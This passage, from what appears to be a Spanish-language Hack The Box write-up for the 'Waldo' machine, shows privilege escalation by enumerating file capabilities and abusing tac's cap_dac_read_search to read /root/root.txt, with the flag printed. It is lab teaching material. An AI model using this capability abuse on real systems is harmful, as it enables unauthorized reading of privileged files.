+monitor@waldo:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+<span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
+monitor@waldo:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si enumeramos por <code class="language-plaintext highlighter-rouge">capabilities</code> encontramos la siguiente tac <a href="https://gtfobins.github.io/gtfobins/tac/">https://gtfobins.github.io/gtfobins/tac/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:/home/nobody<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+getcap <span class="nt">-r</span> / 2&gt;/dev/null
+/bin/ping <span class="o">=</span> cap_net_raw+ep
+/usr/bin/tac <span class="o">=</span> cap_dac_read_search+ei
+/home/monitor/app-dev/v0.1/logMonitor-0.1 <span class="o">=</span> cap_dac_read_search+ei
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno con eso podemos leer cualquier archivo privilegiado del sistema.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:/home/nobody<span class="nv">$ </span><span class="nb">tac</span> /root/root.txt
+7f680a52657f6c1ee72752e7ab096955
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/08/25/waldo.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
